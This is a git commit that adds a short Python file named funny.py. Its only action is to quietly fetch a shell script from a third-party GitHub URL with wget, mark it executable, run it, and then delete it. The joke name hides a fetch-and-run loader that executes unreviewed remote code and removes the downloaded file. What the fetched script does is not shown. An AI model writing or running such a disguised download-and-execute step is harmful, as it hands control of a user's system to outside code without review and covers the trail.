aff8b54001e493940c72b1983d16ddbc14ea2f9e
xBinPDA <nazren3git@gmail.com>
2025-09-08 23:28:55 +0800

    Create funny.py

---
+++ funny.py
@@ -0,0 +1,17 @@
+import subprocess
+import os
+
+def main():
+    os.system('clear')
+
+    url = "https://raw.githubusercontent.com/mrshahnawazyt/Autoscript-1.13/master/setup.sh"
+    subprocess.run(['wget', '-O', 'setup.sh', '-q', url])
+
+    subprocess.run(['chmod', '+x', 'setup.sh'])
+
+    subprocess.run(['./setup.sh'])
+
+    subprocess.run(['rm', '-fr', 'setup.sh'])
+
+if __name__ == "__main__":
+    main()
